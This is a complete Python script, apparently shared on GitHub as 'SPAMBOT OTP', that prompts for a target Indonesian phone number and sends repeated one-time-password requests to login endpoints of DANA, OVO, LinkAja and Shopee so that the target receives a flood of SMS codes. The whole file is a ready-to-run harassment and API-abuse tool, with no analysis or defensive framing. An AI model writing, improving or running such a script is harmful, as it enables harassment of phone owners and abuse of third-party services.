#!/usr/bin/env python3
import requests
import time
import random
import os
import sys

os.system("clear")

banner = """
╔════════════════════════════════════════════════════════════╗
║                    SPAMBOT OTP v1.0                       ║
║              Created by DR4K7H ALI| GitHub                   ║
║         https://github.com/alsoftspoken/SpamBot-OTP             ║
╚════════════════════════════════════════════════════════════╝
"""

print(banner)

def load_config():
    try:
        with open("config.json", "r") as f:
            import json
            return json.load(f)
    except:
        return {"delay": 5, "max_spam": 50}

config = load_config()

nomor = input("[?] Nomor Target (628xxxx): ")
jumlah = int(input(f"[?] Jumlah Spam (max {config['max_spam']}): "))
delay = float(input(f"[?] Delay per spam ({config['delay']} detik): "))

endpoints = [
    {"url": "https://api.dana.id/api/v1/auth/otp/send", "field": "phoneNumber"},
    {"url": "https://api.ovo.id/v2/auth/otp/request", "field": "mobileNo"},
    {"url": "https://api.linkaja.id/v1/otp/send", "field": "msisdn"},
    {"url": "https://api.shopee.co.id/api/v1/account/phone/otp/send", "field": "phone"},
]

headers = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
}

success = 0
fail = 0

print(f"\n[!] START SPAM TO {nomor}\n")

for i in range(jumlah):
    try:
        ep = random.choice(endpoints)
        data = {ep["field"]: nomor}
        r = requests.post(ep["url"], data=data, headers=headers, timeout=10)
        
        if r.status_code in [200, 201, 202]:
            success += 1
            print(f"[✓] {i+1}/{jumlah} SUCCESS - {ep['url'].split('/')[2]}")
        else:
            fail += 1
            print(f"[✗] {i+1}/{jumlah} FAILED - CODE:{r.status_code}")
    except Exception as e:
        fail += 1
        print(f"[!] {i+1}/{jumlah} ERROR - {str(e)[:30]}")
    
    time.sleep(delay)

print(f"\n[!] FINISHED")
print(f"[✓] SUCCESS: {success}")
print(f"[✗] FAILED: {fail}")
